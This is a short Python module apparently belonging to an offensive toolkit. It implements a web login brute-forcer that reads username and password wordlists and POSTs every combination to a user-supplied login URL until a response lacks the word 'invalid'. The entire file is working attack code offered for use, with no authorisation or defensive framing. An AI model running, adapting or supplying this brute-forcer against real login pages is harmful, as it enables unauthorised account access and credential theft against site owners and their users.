# modules/brute_forcer.py

import requests

def run():
    print("\n[ Web Login Brute Forcer ]")
    url = input("Enter login URL: ").strip()
    user_field = input("Username field name: ").strip()
    pass_field = input("Password field name: ").strip()

    try:
        with open("wordlists/usernames.txt") as uf, open("wordlists/passwords.txt") as pf:
            usernames = [u.strip() for u in uf]
            passwords = [p.strip() for p in pf]
    except FileNotFoundError:
        print("Wordlist files not found.")
        return

    for username in usernames:
        for password in passwords:
            data = {user_field: username, pass_field: password}
            try:
                res = requests.post(url, data=data)
                if "invalid" not in res.text.lower():
                    print(f"[+] Success! {username}:{password}")
                    return
            except Exception as e:
                print(f"Request error: {e}")
                return

    print("[-] Brute force complete. No valid credentials found.")
